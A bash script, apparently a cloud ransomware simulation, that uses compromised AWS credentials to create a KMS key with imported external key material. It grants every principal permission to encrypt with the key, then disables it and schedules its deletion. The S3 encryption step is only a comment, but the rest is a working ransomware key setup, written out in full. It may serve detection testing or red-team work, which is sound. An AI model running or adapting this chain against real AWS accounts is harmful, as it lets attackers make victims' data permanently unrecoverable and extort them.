#!/bin/bash

LOGFILE=/tmp/attacker_compromised_credentials_cloud_ransomware.sh.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
check_apt() {
  pgrep -f "apt" || pgrep -f "dpkg"
}
while check_apt; do
  log "Waiting for apt to be available..."
  sleep 10
done

log "Starting..."

log "Setting User-agent: AWS_EXECUTION_ENV=ransomware"
export AWS_EXECUTION_ENV="ransomware"

# install preqs
yum install -y jq openssl >> $LOGFILE 2>&1

# aws account where kms key will be created
AWS_ACCOUNT_ID=$(aws sts get-caller-identity | jq '.Account' --raw-output)
# aws current user arn
AWS_CURRENT_USER=$(aws sts get-caller-identity | jq '.Arn' --raw-output)

log "AWS_ACCOUNT_ID: $AWS_ACCOUNT_ID"
log "AWS_CURRENT_USER: $AWS_CURRENT_USER"

log "Removing key_material directory..."
rm -rf ./key_material
log "Creating key_material directory..."
mkdir ./key_material

KEY_ID=$(aws kms create-key --origin EXTERNAL | jq '.KeyMetadata.KeyId' --raw-output)
log "KEY_ID: $KEY_ID"

log "Generating key material..."
openssl rand -out ./key_material/PlaintextKeyMaterial.bin 32 >> $LOGFILE 2>&1
openssl base64 -in ./key_material/PlaintextKeyMaterial.bin -out ./key_material/PlaintextKeyMaterial.b64 >> $LOGFILE 2>&1
KEY=$(aws kms --region us-east-1 get-parameters-for-import --key-id "$KEY_ID" --wrapping-algorithm RSAES_OAEP_SHA_256 --wrapping-key-spec RSA_2048 --query '{Key:PublicKey,Token:ImportToken}' --output text)
log "KEY: $KEY"
echo "$KEY" | awk '{print $1}' > ./key_material/PublicKey.b64
echo "$KEY" | awk '{print $2}' > ./key_material/ImportToken.b64

log "Decoding base64 key material..."
openssl enc -d -base64 -A -in ./key_material/PublicKey.b64 -out ./key_material/PublicKey.bin >> $LOGFILE 2>&1
openssl enc -d -base64 -A -in ./key_material/ImportToken.b64 -out ./key_material/ImportToken.bin >> $LOGFILE 2>&1
openssl pkeyutl \
    -in ./key_material/PlaintextKeyMaterial.bin \
    -out ./key_material/EncryptedKeyMaterial.bin \
    -inkey ./key_material/PublicKey.bin \
    -keyform DER \
    -pubin \
    -encrypt \
    -pkeyopt \
    rsa_padding_mode:oaep \
    -pkeyopt rsa_oaep_md:sha256 >> $LOGFILE 2>&1

log "Importing key material..."
aws kms \
    --region us-east-1 \
    import-key-material \
    --key-id "$KEY_ID" \
    --encrypted-key-material \
    fileb://./key_material/EncryptedKeyMaterial.bin \
    --import-token fileb://./key_material/ImportToken.bin \
    --expiration-model KEY_MATERIAL_DOES_NOT_EXPIRE >> $LOGFILE 2>&1

log "Creating key policy..."
cat <<EOF > ./key_material/new_key_policy.json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "EnableIAMUserPermissions",
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::$AWS_ACCOUNT_ID:root"
            },
            "Action": "kms:*",
            "Resource": "*"
        },
        {
            "Sid": "EnableCurrentUserKeySetup",
            "Effect": "Allow",
            "Principal": {
                "AWS": "$AWS_CURRENT_USER"
            },
            "Action": [
                    "kms:CreateKey",
                    "kms:ImportKey",
                    "kms:ImportKeyMaterial",
                    "kms:DeleteKey",
                    "kms:DeleteKeyMaterial",
                    "kms:EnableKey",
                    "kms:DisableKey",
                    "kms:ScheduleKeyDeletion",
                    "kms:PutKeyPolicy",
                    "kms:SetPolicy",
                    "kms:DeletePolicy",
                    "kms:CreateGrant",
                    "kms:DeleteIdentity",
                    "kms:DescribeIdentity",
                    "kms:KeyStatus",
                    "kms:Status",                        
                    "kms:List*",
                    "kms:Get*",
                    "kms:Describe*",
                    "tag:GetResources"
            ],
            "Resource": "*"
        },
        {
            "Sid": "EnableGlobalKMSEncrypt",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": [
                "kms:GenerateDataKey",
                "kms:Encrypt"
            ],
            "Resource": "*"
        }
    ]
}
EOF
cat ./key_material/new_key_policy.json >> $LOGFILE 2>&1

# add key policy
log "Adding key policy..."
aws kms put-key-policy \
    --policy-name default \
    --key-id "$KEY_ID" \
    --policy file://./key_material/new_key_policy.json >> $LOGFILE 2>&1

# use key to encrypt s3 bucket content

log "Sleeping 60 seconds..."
sleep 60

log "Disabling created key: $KEY_ID"
aws kms disable-key \
    --key-id "$KEY_ID"

log "Scheduling delete key (7 days): $KEY_ID"
aws kms schedule-key-deletion \
    --key-id "$KEY_ID" \
    --pending-window-in-days 7


log "Done."